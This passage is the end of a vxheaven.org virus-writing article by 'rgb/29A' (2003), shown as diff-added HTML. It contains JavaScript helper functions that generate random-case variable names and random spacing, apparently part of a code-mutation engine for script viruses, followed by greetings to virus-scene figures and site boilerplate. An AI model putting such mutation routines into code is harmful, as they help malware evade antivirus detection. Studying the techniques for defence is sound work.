+&nbsp; with<span style="color: black;">&#40;</span><span style="">Math</span><span style="color: black;">&#41;</span><span style="color: #000066; font-weight: bold;">return</span> <span style="">String</span>.<span style="color: #660066;">fromCharCode</span><span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">26</span><span style="color: #339933;">+</span><span style="color: #CC0000;">65</span><span style="color: #339933;">+</span>round<span style="color: black;">&#40;</span>random<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">32</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">function</span> outv<span style="color: black;">&#40;</span>tvar<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//variable or keyword followed by random number of spaces</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; newl<span style="color: #339933;">+=</span>tvar<br/>
+&nbsp; dospc<span style="color: black;">&#40;</span>loff<span style="color: #339933;">+</span>oldl.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>loff<span style="color: black;">&#41;</span>.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span><span style="color: #339933;">/</span> <span style="color: #339933;">/</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">function</span> nvar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//random sequence of random case letters</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; <span style="color: #000066; font-weight: bold;">do</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; tv<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
+&nbsp; &nbsp; cb<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><br/>
+&nbsp; &nbsp; while<span style="color: black;">&#40;</span><span style="color: #339933;">++</span>cb<span style="color: #339933;">&lt;</span><span style="">Math</span>.<span style="color: #660066;">random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: #CC0000;">5</span><span style="color: #339933;">+</span><span style="color: #CC0000;">6</span><span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//5-9 characters</span><br/>
+&nbsp; &nbsp; &nbsp; tv<span style="color: #339933;">+=</span>rchar<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; while<span style="color: black;">&#40;</span>tv<span style="color: #339933;">==</span>v1<span style="color: #339933;">||</span>tv<span style="color: #339933;">==</span>v2<span style="color: #339933;">||</span>tv<span style="color: #339933;">==</span>v3<span style="color: #339933;">||</span>tv<span style="color: #339933;">==</span>v4<span style="color: #339933;">||</span>tv<span style="color: #339933;">==</span>v5<span style="color: black;">&#41;</span><br/>
+&nbsp; outv<span style="color: black;">&#40;</span>tv<span style="color: black;">&#41;</span><br/>
+&nbsp; <span style="color: #000066; font-weight: bold;">return</span> tv<br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #000066; font-weight: bold;">function</span> outch<span style="color: black;">&#40;</span>ch<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">//character followed by random number of spaces</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; newl<span style="color: #339933;">+=</span>ch<br/>
+&nbsp; dospc<span style="color: black;">&#40;</span>loff<span style="color: #339933;">+</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p><strong>Greets to friendly people (A-Z):</strong></p>
+<p>Active - Benny - Obleak - Prototype - Ratter - Ronin - RT Fishel - The Gingerbread Man - Ultras - Vecna - VirusBuster - Whitehead</p>
+<div align="right">rgb/29A feb 2003<br/><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80e9e1eddff2e7e2c0e8eff4ede1e9ecaee3efed">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></div>
+[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg21">Back to index</a>] [<a href="/lib/vrg21.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrg21">de</a><a href="/lib/index.php?lang=en&amp;id=vrg21">en</a><a href="/lib/index.php?lang=es&amp;id=vrg21">es</a><a href="/lib/index.php?lang=it&amp;id=vrg21">it</a><a href="/lib/index.php?lang=fr&amp;id=vrg21">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrg21">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrg21">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrg21">ua</a></div>
+</body>
+</html>
